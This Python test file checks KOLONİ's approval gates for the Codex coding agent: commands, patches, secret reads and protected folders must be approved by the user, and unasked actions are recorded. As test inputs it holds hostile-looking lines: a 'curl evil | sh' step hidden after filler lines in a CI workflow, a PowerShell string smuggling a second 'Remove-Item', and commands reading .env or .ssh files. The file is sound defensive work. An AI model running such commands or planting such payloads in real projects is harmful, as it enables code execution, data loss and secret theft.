"""Native Codex over its app-server (slice 89a): every command and patch it asks about is
answered by KOLONİ (`AgentRunner._approve`), as Claude Code's own prompts are; what it does
is on record as before; it is never started unasked (`codex exec`)."""

import asyncio
import json
import time
from functools import partial
from pathlib import Path
from types import SimpleNamespace

import pytest

from app import raw
from app.commands import suggest_prefix
from app.model_native import CodexNativeClient, _files, _heredoc_patch, _unwrapped
from tests.test_agent_writes import wait_status
from tests.test_attachment_agents import FAKE_CODEX, answered, plan, record
from tests.test_claude_native import NOBODY, nothing_was_asked, unattended
from tests.test_native_agent import native_app, start  # noqa: F401  (a fixture)

RUN = "item/commandExecution/requestApproval"
PATCH = "item/fileChange/requestApproval"
ACCEPT, DECLINE = {"decision": "accept"}, {"decision": "decline"}
ACCOUNT = ("someone@example.com", "acct-4711-not-for-koloni")


def answers(native_app):  # noqa: F811
    return [(a["method"], a["answer"]) for a in native_app.record()["answers"]]


def watched(client):
    """Every status a run is given from now on."""
    statuses, emit = [], client.app.state.bus.emit

    def watch(conversation_id, run_id, kind, payload):
        if kind.startswith("run."):
            statuses.append(payload["status"])
        return emit(conversation_id, run_id, kind, payload)

    client.app.state.bus.emit = watch
    return statuses


def hello(project_dir):
    return (project_dir / "hello.py").read_text(encoding="utf-8")


# --- 1. Ask: a command is a card -----------------------------------------------------------


def test_at_ask_codexs_command_is_a_card_and_runs_once_approved(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": "pytest -q", "output": "2 passed\n", "touches": {"ran.txt": "x"}},
        {"say": "Tests pass."}])
    cid, run_id = start(client, project_dir, provider, mode="ask")
    asked = wait_status(client, cid, "waiting_approval")["commands"][0]
    assert (asked["status"], asked["command"], asked["origin"]) == ("proposed", "pytest -q", "cli")
    assert not (project_dir / "ran.txt").exists()  # nothing ran before the yes
    assert client.post(f"/api/commands/{asked['id']}/approve", json={}).status_code == 200
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]
    assert answers(native_app) == [(RUN, ACCEPT)]
    (done,) = snap["commands"]  # one record: the card is the command
    assert (done["status"], done["exit_code"], done["output"]) == ("exited", 0, "2 passed\n")
    assert (project_dir / "ran.txt").exists()
    # (and what the command wrote, found after it)
    assert [(t["name"], t["status"]) for t in snap["tool_calls"]] == [
        ("run_command", "succeeded"), ("write_file", "succeeded")]


def test_at_ask_a_rejected_command_is_declined_and_never_runs(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": "pytest -q", "touches": {"ran.txt": "x"}}, {"say": "Left it."}])
    cid, run_id = start(client, project_dir, provider, mode="ask")
    asked = wait_status(client, cid, "waiting_approval")["commands"][0]
    assert client.post(f"/api/commands/{asked['id']}/reject").status_code == 200
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed"  # a decline carries the turn on
    assert answers(native_app) == [(RUN, DECLINE)]
    assert not (project_dir / "ran.txt").exists()
    assert [c["status"] for c in snap["commands"]] == ["rejected"]
    assert [(t["name"], t["status"]) for t in snap["tool_calls"]] == [("run_command", "denied")]


def test_a_card_left_open_longer_than_the_silence_limit_does_not_end_codex(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([{"run": "pytest -q"}, {"say": "ok"}], timeout=2)
    cid, run_id = start(client, project_dir, provider, mode="ask")
    asked = wait_status(client, cid, "waiting_approval")["commands"][0]
    time.sleep(5)  # the user is thinking: Codex waits for the answer, and says nothing
    client.post(f"/api/commands/{asked['id']}/approve", json={})
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]


# --- 2. Full auto: only what is asked at every level is a card ------------------------------


def test_at_full_auto_an_ordinary_command_is_accepted_unasked(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([{"run": "pytest -q", "output": "ok\n"}, {"say": "ok"}])
    statuses = watched(client)
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, ACCEPT)]
    nothing_was_asked(snap, statuses)
    assert [c["status"] for c in snap["commands"]] == ["exited"]


def test_at_full_auto_a_command_that_reads_a_secret_is_a_card(
    native_app, wait_run, project_dir  # noqa: F811
):
    (project_dir / ".env").write_text("TOKEN=x\n", encoding="utf-8")
    client, provider, _ = native_app([{"run": "type .env", "output": "TOKEN=x\n"},
                                      {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    asked = wait_status(client, cid, "waiting_approval")["commands"][0]
    assert (asked["command"], asked["status"]) == ("type .env", "proposed")
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)]


def test_a_deleting_command_is_a_card_where_commands_are_asked_and_marked_as_deleting(
    native_app, wait_run, project_dir  # noqa: F811
):
    # As for Claude Code's own Bash and KOLONİ's own commands (slice 90): no allow-list rule
    # ever covers it, and at Full auto too it is a card (K-fullauto-sorma: harm asks there).
    client, provider, _ = native_app([{"run": "rm -rf build"}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider, mode="auto_edit")
    asked = wait_status(client, cid, "waiting_approval")["commands"][0]
    assert asked["command"] == "rm -rf build" and asked["danger"]
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)]
    native_app.rescript([{"run": "rm -rf build"}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    asked = wait_status(client, cid, "waiting_approval")["commands"][-1]
    assert asked["command"] == "rm -rf build" and asked["danger"]
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)]


# --- 3. Full auto: a patch that stands over later turns is a card -----------------------------


def test_at_full_auto_a_patch_to_a_workflow_is_a_card_and_an_ordinary_one_is_not(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"write": "hello.py", "content": "print('hello')\n"},
        {"write": ".github/workflows/x.yml", "content": "on: push\n"}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_status(client, cid, "waiting_approval")
    assert hello(project_dir) == "print('hello')\n"  # the ordinary one: unasked
    (card,) = [c for c in snap["file_changes"] if c["status"] == "proposed"]
    assert card["path"] == ".github/workflows/x.yml" and "+on: push" in card["diff"]
    assert not (project_dir / ".github").exists()
    client.post(f"/api/file-changes/{card['id']}/approve")
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]
    assert answers(native_app) == [(PATCH, ACCEPT), (PATCH, ACCEPT)]
    assert (project_dir / ".github" / "workflows" / "x.yml").read_text(encoding="utf-8") == (
        "on: push\n")
    assert sorted((c["path"], c["status"]) for c in snap["file_changes"]) == [
        (".github/workflows/x.yml", "applied"), ("hello.py", "applied")]


def test_a_patch_with_one_protected_file_is_a_card_for_the_whole_patch(
    native_app, wait_run, project_dir  # noqa: F811
):
    # (K-fullauto-sorma 2: CLAUDE.md alone is no card at Full auto - the test after this; a
    # workflow still is, and the card is the whole patch's.)
    workflow = project_dir / ".github/workflows/ci.yml"
    client, provider, _ = native_app([
        {"write": "hello.py", "content": "changed\n", "also": [str(workflow)]},
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_status(client, cid, "waiting_approval")
    (card,) = [c for c in snap["file_changes"] if c["status"] == "proposed"]
    assert card["path"] == ".github/workflows/ci.yml"
    client.post(f"/api/file-changes/{card['id']}/reject")
    snap = wait_run(client, cid, run_id)
    assert answers(native_app) == [(PATCH, DECLINE)]
    # neither file was written: the answer is the whole patch's
    assert hello(project_dir) == "print('hi')\n" and not workflow.exists()
    assert [c["status"] for c in snap["file_changes"]] == ["rejected"]


def test_at_full_auto_a_patch_with_an_instruction_file_alone_is_not_a_card(
    native_app, wait_run, project_dir  # noqa: F811
):
    """K-fullauto-sorma 2: CLAUDE.md beside an ordinary file - written unasked."""
    claude_md = project_dir / "CLAUDE.md"
    client, provider, _ = native_app([
        {"write": "hello.py", "content": "changed\n", "also": [str(claude_md)]},
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]
    assert answers(native_app) == [(PATCH, ACCEPT)]
    assert hello(project_dir) == "changed\n" and claude_md.exists()


def proposed(client, cid, path):
    """The change to `path` waiting for the user, once it is shown."""
    for _ in range(500):
        snap = client.get(f"/api/conversations/{cid}").json()
        waiting = [c for c in snap["file_changes"] if c["status"] == "proposed"]
        if [c["path"] for c in waiting] == [path]:
            return waiting[0]
        time.sleep(0.02)
    raise AssertionError(f"no change to {path} was shown")


def test_at_ask_each_file_of_a_patch_is_its_own_card(
    native_app, wait_run, project_dir  # noqa: F811
):
    other = project_dir / "notes.txt"
    client, provider, _ = native_app([
        {"write": "new.py", "content": "made\n", "also": [str(other)]}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider, mode="ask")
    for path in ("new.py", "notes.txt"):
        card = proposed(client, cid, path)
        assert "+made" in card["diff"]
        client.post(f"/api/file-changes/{card['id']}/approve")
    snap = wait_run(client, cid, run_id)
    assert answers(native_app) == [(PATCH, ACCEPT)]
    assert sorted((c["path"], c["status"]) for c in snap["file_changes"]) == [
        ("new.py", "applied"), ("notes.txt", "applied")]


def test_at_ask_a_change_to_a_file_is_asked_in_words_with_its_diff(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([{"write": "hello.py", "content": "changed\n"},
                                      {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider, mode="ask")
    question = wait_status(client, cid, "waiting_approval")["questions"][0]
    assert "Codex wants to use its Edit tool on hello.py" in question["question"]
    assert "+changed" in question["question"]  # what it would change, as Codex said it
    client.post(f"/api/questions/{question['id']}/answer", json={"answer": "Allow"},
                headers={"Origin": "http://127.0.0.1:8790"})
    snap = wait_run(client, cid, run_id)
    assert answers(native_app) == [(PATCH, ACCEPT)]
    assert hello(project_dir) == "changed\n"
    assert [(c["path"], c["status"]) for c in snap["file_changes"]] == [("hello.py", "applied")]


# --- 4. A turn nobody is watching ----------------------------------------------------------


def test_unattended_codex_is_declined_what_its_trigger_does_not_allow_and_nobody_is_asked(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": "pytest -q", "output": "ok\n"},
        {"run": "pytest -q && echo x", "touches": {"ran.txt": "x"}},
        {"write": "hello.py", "content": "changed\n"}, {"say": "done"}])
    # (The first line - no CLI with tools of its own starts unwatched - is switched off.)
    snap, run, statuses = unattended(
        client, project_dir, provider, "full_auto", wait_run, commands=["pytest -q"])
    assert run["status"] == "completed", run
    assert answers(native_app) == [(RUN, ACCEPT), (RUN, DECLINE), (PATCH, DECLINE)]
    assert hello(project_dir) == "print('hi')\n" and not (project_dir / "ran.txt").exists()
    assert [(t["name"], t["status"]) for t in snap["tool_calls"]] == [
        ("run_command", "succeeded"), ("run_command", "denied"), ("edit_file", "denied")]
    assert all(NOBODY in t["result"] for t in snap["tool_calls"][1:])
    nothing_was_asked(snap, statuses)


# --- 5. Any other request is declined -------------------------------------------------------


def test_every_other_request_of_codexs_is_declined_and_on_record(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"request": "item/tool/requestUserInput", "params": {"questions": []}},
        {"request": "item/permissions/requestApproval", "params": {"permissions": {}}},
        {"request": "mcpServer/elicitation/request", "params": {"serverName": "s"}},
        {"request": "item/tool/call", "params": {"tool": "t", "arguments": {}}},
        # a command's request to write to a terminal, a patch asking for a whole folder, and
        # one for a patch it never said it was making: none of them is answered yes
        {"request": RUN, "params": {"kind": "writeStdin", "command": "y"}},
        {"request": PATCH, "params": {"grantRoot": "C:/"}},
        {"request": PATCH, "params": {}},
        # whose account it is: of such a request only its name is put on record
        {"request": "account/chatgptAuthTokens/refresh",
         "params": {"previousAccountId": "acct-4711-not-for-koloni"}},
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]
    told = answers(native_app)
    assert [method for method, _ in told[:4]] == [
        "item/tool/requestUserInput", "item/permissions/requestApproval",
        "mcpServer/elicitation/request", "item/tool/call"]
    assert told[2][1] == {"action": "decline"}
    assert all("error" in answer for method, answer in told[:4] if "elicitation" not in method)
    assert [answer for _, answer in told[4:7]] == [DECLINE, DECLINE, DECLINE]
    assert "error" in told[7][1]
    declined = [t for t in snap["tool_calls"] if t["status"] == "denied"]
    assert len(declined) == 8 and all("KOLONİ" in t["result"] for t in declined)
    assert json.loads(declined[-1]["arguments"]) == {}
    assert ACCOUNT[1] not in json.dumps(snap)


# --- 6. What it did is on record as before; whose account it is, nowhere ---------------------


def test_codexs_commentary_is_not_its_message(native_app, wait_run, project_dir):  # noqa: F811
    """B-182 (live): a note to itself between its steps went into the chat."""
    client, provider, _ = native_app([
        {"say": "Wait mixed languages oops commentary need", "phase": "commentary"},
        {"say": "Done.", "phase": "final_answer"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert [m["content"] for m in snap["messages"][1:] if m["content"]] == ["Done."]
    # A turn that said nothing but commentary is not left empty: its last one is what it said.
    native_app.rescript([{"say": "Looking at it.", "phase": "commentary"},
                         {"say": "Reading hello.py.", "phase": "commentary"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert [m["content"] for m in snap["messages"][1:] if m["content"]] == ["Reading hello.py."]


def test_what_codex_does_is_on_record_and_its_account_is_nowhere(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"say": "I will fix it."},
        {"write": "hello.py", "content": "print('hello')\n"}, {"pause": 0.3},
        {"run": "python hello.py", "output": "hello\n"}, {"pause": 0.3},
        {"mcp": {"server": "docs", "tool": "lookup", "result": "found"}},
        {"web": "python print"},
        {"say": "Fixed."}])
    cli = client.app.state.providers.named["Codex"]
    limits = client.app.state.providers.limits
    cli.on_limits = partial(limits.codex_said, ("codex_cli", None))
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]
    assert [m["content"] for m in snap["messages"][1:] if m["content"]] == [
        "I will fix it.", "Fixed.", "In the project: hello.py (+1 −1)."]  # (B-205: KOLONİ's line)
    assert [(t["name"], t["status"], t["origin"]) for t in snap["tool_calls"]] == [
        ("edit_file", "succeeded", "cli"), ("run_command", "succeeded", "cli"),
        ("docs__lookup", "succeeded", "cli"), ("web_search", "succeeded", "cli")]
    (change,) = snap["file_changes"]
    assert (change["path"], change["kind"], change["status"]) == ("hello.py", "modify", "applied")
    assert "+print('hello')" in change["diff"]
    (ran,) = snap["commands"]
    assert (ran["command"], ran["status"], ran["exit_code"], ran["output"]) == (
        "python hello.py", "exited", 0, "hello\n")
    agent = snap["agents"][0]
    assert (agent["input_tokens"], agent["output_tokens"]) == (4000, 120)  # the thread's total
    # what it said of its plan's limits after the turn is the provider's last reading
    reading = client.get(f"/api/providers/{provider['id']}/limits").json()
    assert reading["windows"][0]["used_percent"] == 7
    # account/updated said whose account this is: kept nowhere, shown nowhere
    kept = raw.read(agent["id"])
    for where in (json.dumps(snap), json.dumps(kept), json.dumps(reading)):
        assert not [one for one in ACCOUNT if one in where]
    # B-343: what its turn was asked with (its level, where one is) is in its raw stream, as
    # sent - the prompt left out
    (sent,) = [json.loads(line["text"]) for line in kept["lines"] if line["stream"] == "stdin"]
    assert sent == {"method": "turn/start", "params": native_app.record()["turn"]}


# --- 7. A start that goes wrong: never `exec` -------------------------------------------------


def test_a_codex_that_cannot_be_asked_first_is_stopped_with_its_version_and_never_runs_unasked(
    native_app, wait_run, project_dir, tmp_path  # noqa: F811
):
    starts = tmp_path / "starts.jsonl"
    client, provider, _ = native_app([])
    for handshake, why in (("initialize", "unknown client"), ("thread", "unknown field cwd"),
                           ("policy", "on-request"),
                           # the user's own config.toml made more of it than was asked for
                           ("reviewer", "auto_review"), ("wider", "writable"),
                           ("network", "network"), ("full", "dangerFullAccess")):
        starts.unlink(missing_ok=True)
        native_app.rescript([{"write": "hello.py", "content": "x"}], handshake=handshake,
                            starts=str(starts))
        cid, run_id = start(client, project_dir, provider)
        run = wait_run(client, cid, run_id)["runs"][0]
        assert run["status"] == "failed"
        assert "Codex 0.164.0-fake could not be asked before it acts" in run["error"]
        assert why in run["error"] and "run it as a step instead" in run["error"]
        started = [json.loads(line) for line in starts.read_text("utf-8").splitlines()]
        # (its version first: a measured one is asked nothing more, K-cli-surface)
        assert [argv[-1] for argv in started] == ["--version", "app-server", "--version"]
        assert not [argv for argv in started if "exec" in argv]
        assert hello(project_dir) == "print('hi')\n"
        if handshake != "initialize":  # every request is KOLONİ's to answer, nobody else's
            assert native_app.record()["thread"]["approvalsReviewer"] == "user"


def test_the_bridge_of_kolonis_tools_and_nothing_of_the_users_is_on_its_line(
    native_app, wait_run, project_dir, tmp_path, monkeypatch  # noqa: F811
):
    home = tmp_path / "codex-home"
    home.mkdir()
    (home / "config.toml").write_text('[mcp_servers.mine]\ncommand = "x"\n', encoding="utf-8")
    monkeypatch.setenv("CODEX_HOME", str(home))
    client, provider, _ = native_app([{"say": "hi"}])
    cid, run_id = start(client, project_dir, provider)
    wait_run(client, cid, run_id)
    argv = native_app.record()["argv"]
    settings = [argv[i + 1] for i, a in enumerate(argv) if a == "-c"]
    # a tool of an MCP server of the user's is not one Codex asks about: it is off
    assert "mcp_servers.mine.enabled=false" in settings
    assert "mcp_servers.koloni.enabled=true" in settings and argv[-1] == "app-server"
    assert Path(native_app.record()["thread"]["cwd"]) == project_dir


# --- 8. Its MCP tool calls are asked about too (measured on 0.164.0, 24 Oct 2026) -----------


def test_kolonis_own_tools_are_let_through_and_a_server_of_its_own_is_not(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"koloni": "read_notes"},
        {"mcp": {"server": "docs", "tool": "lookup", "elicit": True, "result": "found"}},
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]
    # KOLONİ's own tool is held to KOLONİ's own rules where it runs: Codex may call it
    assert [answer for _, answer in answers(native_app)] == [
        {"action": "accept", "content": {}}, {"action": "decline"}]
    assert native_app.record()["results"][0] is not None  # it ran
    (theirs,) = [t for t in snap["tool_calls"] if t["name"] == "docs__lookup"]
    assert theirs["status"] == "failed" and "rejected" in theirs["result"]


# --- 9. What it did without being asked is said to have been ---------------------------------

UNASKED = "ran without KOLONİ being asked (Codex's own rules)"


def test_a_command_and_a_patch_codex_did_without_asking_are_marked_so(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": "Get-ChildItem", "output": "hello.py\n", "unasked": True},
        {"write": "hello.py", "content": "changed\n", "unasked": True}, {"pause": 0.3},
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed"  # the turn goes on
    assert answers(native_app) == []
    (ran,) = [t for t in snap["tool_calls"] if t["name"] == "run_command"]
    assert UNASKED in ran["result"]
    assert [t for t in snap["tool_calls"] if UNASKED in (t["result"] or "")
            and "hello.py" in t["result"]]


def test_a_file_a_patch_takes_in_after_it_was_asked_about_is_marked_unasked(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"write": "hello.py", "content": "changed\n", "grows": "extra.py"}, {"pause": 0.3},
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert answers(native_app) == [(PATCH, ACCEPT)]
    marked = [t["result"] for t in snap["tool_calls"] if UNASKED in (t["result"] or "")]
    assert len(marked) == 1 and "extra.py" in marked[0]
    assert sorted(c["path"] for c in snap["file_changes"]) == ["extra.py", "hello.py"]


# --- 10. A request asked again, one with a reason, one for elsewhere -------------------------


def test_a_request_asked_again_for_the_same_command_is_declined(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([{"run": "pytest -q", "twice": True}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, ACCEPT), (RUN, DECLINE)]
    assert [t for t in snap["tool_calls"] if t["status"] == "denied" and "again" in t["result"]]


def test_a_request_that_gives_a_reason_is_a_card_even_at_full_auto(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": "pip install x", "reason": "needs the network"}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_status(client, cid, "waiting_approval")
    (asked,) = snap["commands"]
    (call_of,) = [t for t in snap["tool_calls"] if t["id"] == asked["tool_call_id"]]
    assert "needs the network" in call_of["arguments"]  # why it asks is shown with it
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)]


def test_a_command_said_to_run_outside_the_project_is_a_card_even_at_full_auto(
    native_app, wait_run, project_dir, tmp_path  # noqa: F811
):
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    client, provider, _ = native_app([{"run": "pytest -q", "cwd": str(elsewhere)},
                                      {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    (asked,) = wait_status(client, cid, "waiting_approval")["commands"]
    assert asked["status"] == "proposed"
    assert asked["cwd"] == str(elsewhere)  # (on the record as the CLI gave it)
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)]


def card_for(client, cid, command):
    """The command `command` waiting for the user, once it is shown; fails if it ran unasked."""
    for _ in range(500):
        snap = client.get(f"/api/conversations/{cid}").json()
        mine = [c for c in snap["commands"] if c["command"] == command]
        # (a new row is "proposed" for a moment even when it is not asked about)
        if mine and mine[0]["status"] == "proposed" and (
                snap["runs"][0]["status"] == "waiting_approval"):
            return mine[0]
        assert not mine or mine[0]["status"] in ("proposed", "approved"), mine[0]["status"]
        time.sleep(0.02)
    raise AssertionError(f"no card for {command}")


def test_a_command_is_judged_in_the_folder_it_is_said_to_run_in_even_at_full_auto(
    native_app, wait_run, project_dir  # noqa: F811
):
    # denetim-010 #18: `> settings.json` run in `.claude` writes Claude Code's settings, and
    # `cat config` in `.ssh` reads a key's folder - though neither line names that folder.
    for folder in (".claude", ".ssh"):
        (project_dir / folder).mkdir()
    lines = {".claude": "echo x > settings.json", ".ssh": "cat config"}
    client, provider, _ = native_app([
        *[{"run": line, "cwd": str(project_dir / folder)} for folder, line in lines.items()],
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    for folder, line in lines.items():
        asked = card_for(client, cid, line)
        assert asked["cwd"] == folder
        client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE), (RUN, DECLINE)]


def test_a_projects_own_path_is_not_judged_as_a_protected_folder(
    native_app, wait_run, tmp_path  # noqa: F811
):
    # Its cwd is judged inside the project: `.vscode` in the path to the project is no card.
    project = tmp_path / ".vscode" / "extensions" / "x"
    project.mkdir(parents=True)
    client, provider, _ = native_app([{"run": "ls", "cwd": str(project)}, {"say": "ok"}])
    cid, run_id = start(client, project, provider)
    snap = wait_run(client, cid, run_id)
    assert snap["runs"][0]["status"] == "completed", snap["runs"][0]["error"]
    assert answers(native_app) == [(RUN, ACCEPT)]


# --- 11. Its PowerShell line is judged by the command inside it ------------------------------

WRAPPED = '"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -Command \'{}\''


def test_the_command_inside_codexs_powershell_line_is_what_is_judged(
    native_app, wait_run, project_dir  # noqa: F811
):
    origin = {"Origin": "http://127.0.0.1:8790"}
    client, provider, _ = native_app([
        {"run": WRAPPED.format("pytest -q")},
        {"run": WRAPPED.format("Remove-Item -Recurse build")}, {"say": "ok"}])
    pid = client.post("/api/projects", json={"root_path": str(project_dir)}).json()["id"]
    cid = client.post(f"/api/projects/{pid}/conversations").json()["id"]
    client.patch(f"/api/conversations/{cid}", json={
        "permission_mode": "auto_edit", "provider_id": provider["id"]}, headers=origin)
    assert client.post(f"/api/conversations/{cid}/allowed-commands", headers=origin,
                       json={"prefix": "pytest -q"}).status_code in (200, 201)
    run_id = client.post(f"/api/conversations/{cid}/messages",
                         json={"content": "go"}).json()["run"]["id"]
    snap = wait_status(client, cid, "waiting_approval")
    # "Always run" covered the first; the second deletes, and its card says so
    (asked,) = [c for c in snap["commands"] if c["status"] == "proposed"]
    assert asked["command"] == "Remove-Item -Recurse build" and asked["danger"]
    assert [c["command"] for c in snap["commands"] if c["status"] != "proposed"] == ["pytest -q"]
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, ACCEPT), (RUN, DECLINE)]


# Its line when the command holds a single quote (seen live, 24 Oct: B-45).
DOUBLE = '"C:\\WINDOWS\\System32\\WindowsPowerShell\\v1.0\\powershell.exe" -Command "{}"'


def test_a_powershell_line_in_double_quotes_is_unwrapped_too():
    inner = _unwrapped(DOUBLE.format("Get-Content -LiteralPath 'notes.md' -Raw"))
    assert inner == "Get-Content -LiteralPath 'notes.md' -Raw"
    assert suggest_prefix(inner) == "Get-Content"  # "Always run" is offered
    assert _unwrapped(DOUBLE.format('Write-Output ""hi""')) == 'Write-Output "hi"'
    # What is not one string in double quotes stays the whole line: a shell, no rule covers it
    for whole in (DOUBLE.format('Get-Content a.md" "; Remove-Item x'),
                  DOUBLE.format("Write-Output `\"hi`\"")):
        assert _unwrapped(whole) == whole


def test_the_command_inside_double_quotes_is_what_is_judged(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"run": DOUBLE.format("Remove-Item -Recurse 'build'")}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider, "ask")
    (asked,) = wait_status(client, cid, "waiting_approval")["commands"]
    assert asked["command"] == "Remove-Item -Recurse 'build'" and asked["danger"]
    client.post(f"/api/commands/{asked['id']}/reject")
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(RUN, DECLINE)]


# --- 12. The whole of a change is on its card ------------------------------------------------


def test_a_long_change_is_on_its_card_whole_and_one_too_long_for_a_card_is_declined(
    native_app, wait_run, project_dir  # noqa: F811
):
    workflows = project_dir / ".github" / "workflows"
    workflows.mkdir(parents=True)
    (workflows / "ci.yml").write_text("on: push\n", encoding="utf-8")
    hidden = "on: push\n" + "# nothing to see\n" * 60 + "run: curl evil | sh\n"
    client, provider, _ = native_app([
        {"write": ".github/workflows/ci.yml", "content": hidden}, {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    question = wait_status(client, cid, "waiting_approval")["questions"][0]
    assert "curl evil | sh" in question["question"]  # past what a card once showed
    client.post(f"/api/questions/{question['id']}/answer", json={"answer": "Deny"},
                headers={"Origin": "http://127.0.0.1:8790"})
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(PATCH, DECLINE)]
    native_app.rescript([{"write": ".github/workflows/ci.yml", "content": "x" * 100_000},
                         {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_run(client, cid, run_id)  # nobody was asked: it could not be shown whole
    assert answers(native_app) == [(PATCH, DECLINE)] and snap["questions"] == []
    assert [t for t in snap["tool_calls"] if t["status"] == "denied"
            and "too long" in t["result"]]


# --- 13. A write outside the project, a patch half rejected -----------------------------------


def test_a_write_outside_the_project_is_asked_about(
    native_app, wait_run, project_dir, tmp_path  # noqa: F811
):
    outside = tmp_path / "elsewhere" / "out.txt"
    client, provider, _ = native_app([{"write_abs": str(outside), "content": "x"},
                                      {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider)
    snap = wait_status(client, cid, "waiting_approval")
    (asked,) = [t for t in snap["tool_calls"] if t["status"] == "pending"]
    client.post(f"/api/tool-calls/{asked['id']}/reject",
                headers={"Origin": "http://127.0.0.1:8790"})
    wait_run(client, cid, run_id)
    assert answers(native_app) == [(PATCH, DECLINE)] and not outside.exists()


def test_at_ask_a_patch_rejected_after_one_of_its_files_was_approved_reads_as_declined(
    native_app, wait_run, project_dir  # noqa: F811
):
    client, provider, _ = native_app([
        {"write": "new.py", "content": "made\n", "also": [str(project_dir / "notes.txt")]},
        {"say": "ok"}])
    cid, run_id = start(client, project_dir, provider, mode="ask")
    client.post(f"/api/file-changes/{proposed(client, cid, 'new.py')['id']}/approve")
    client.post(f"/api/file-changes/{proposed(client, cid, 'notes.txt')['id']}/reject")
    snap = wait_run(client, cid, run_id)
    assert answers(native_app) == [(PATCH, DECLINE)]
    (first,) = [t for t in snap["tool_calls"] if "new.py" in t["arguments"]]
    assert "the patch it was part of was declined" in first["result"]
    assert not (project_dir / "new.py").exists()


# --- 89d: words into its turn while it works -------------------------------------------------

async def steered(client, tmp_path, words="use blue", said_first=False):
    """A native run with `words` steered into it once its turn is open (`said_first`: and it
    has said something): what the steer gave back, the run's usage, what it said, what it
    did, and the run's steer, to try again."""
    doors, said, items = [], [], []

    async def on_text(text):
        said.append(text)

    async def on_item(phase, item):
        items.append((phase, item))

    async def steer():
        while not doors or said_first and not said:
            await asyncio.sleep(0.05)
        return await doors[0](words)

    trying = asyncio.ensure_future(steer())
    usage = await client.run_native(
        "m", [{"role": "system", "content": "s"}, {"role": "user", "content": "go"}], [],
        str(tmp_path), answered, on_text, on_item, on_live=lambda door: door and doors.append(door))
    return await trying, usage, said, items, doors[0]


